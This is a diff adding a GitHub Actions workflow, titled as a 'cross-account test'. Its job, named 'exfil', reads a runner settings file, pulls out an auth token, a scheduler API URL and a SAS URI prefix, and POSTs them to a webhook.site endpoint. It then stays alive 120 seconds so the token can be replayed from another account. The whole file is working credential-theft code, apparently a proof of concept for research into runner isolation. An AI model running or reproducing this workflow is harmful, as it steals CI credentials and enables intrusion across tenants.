@@ -1,0 +1,40 @@
+name: Cross-Account Test - Account A (Token Source)
+on: [push, workflow_dispatch]
+jobs:
+  exfil:
+    runs-on: ubuntu-24.04
+    steps:
+      - name: Capture authToken and schedulerApiUrl
+        run: |
+          python3 - << 'PYEOF'
+          import json, os, urllib.request
+
+          with open('/opt/hca/.settings') as f:
+              s = json.load(f)
+
+          token   = s['authToken']
+          api_url = s['schedulerApiUrl'].rstrip('/')
+          sas     = s.get('diagnosticsSasUri', '')
+
+          payload = json.dumps({
+              'source': 'account_a',
+              'run_id': os.environ.get('GITHUB_RUN_ID', 'unknown'),
+              'repo':   os.environ.get('GITHUB_REPOSITORY', 'unknown'),
+              'token':  token,
+              'api_url': api_url,
+              'sas_prefix': sas[:80] if sas else '',
+          }).encode()
+
+          req = urllib.request.Request(
+              'https://webhook.site/53b82227-04b4-4ad2-9ccd-2abbd8a81837',
+              data=payload,
+              headers={'Content-Type': 'application/json'},
+              method='POST'
+          )
+          resp = urllib.request.urlopen(req, timeout=10)
+          print(f'Exfil HTTP: {resp.status}')
+          print(f'api_url: {api_url}')
+          print(f'token[:30]: {token[:30]}...')
+          PYEOF
+      - name: Keep job alive for cross-account replay window (120s)
+        run: sleep 120
